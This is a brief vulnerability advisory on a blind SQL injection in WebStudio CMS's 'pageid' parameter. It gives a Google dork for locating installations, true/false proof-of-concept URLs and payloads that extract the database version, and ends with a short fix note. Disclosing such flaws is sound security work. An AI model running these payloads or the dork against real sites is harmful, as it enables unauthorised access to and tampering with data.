Bug Type:     WebStudio CMS (pageid) Blind SQL Injection Vulnerability



Exploitation: Remote



Severity: Critical



Solution Status: Unpatched



Introduction: WebStudio CMS is a modular Web Content Management System
solution.



Google Dork:  "Powered by WebStudio"





Description:



WebStudio CMS is prone to an SQL-injection vulnerability because it fails to
sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application,
access or modify data, or exploit latent vulnerabilities in the underlying
database.



PoC:



http://localhost/index.php?pageid=1+and+1=1 ( TRUE  )



http://localhost/index.php?pageid=1+and+1=2 ( FALSE )



Exploit:



http://localhost/index.php?pageid=1+and+substring(@@version,1,1)=3 ( TRUE  )



http://localhost/index.php?pageid=1+and+substring(@@version,1,1)=4 ( FALSE )



http://localhost/index.php?pageid=1+and+substring(@@version,1,1)=5 ( FALSE )



Solution:



There was no vendor-supplied solution at the time of entry.



Edit source code manually to ensure user-supplied input is correctly
sanitised.
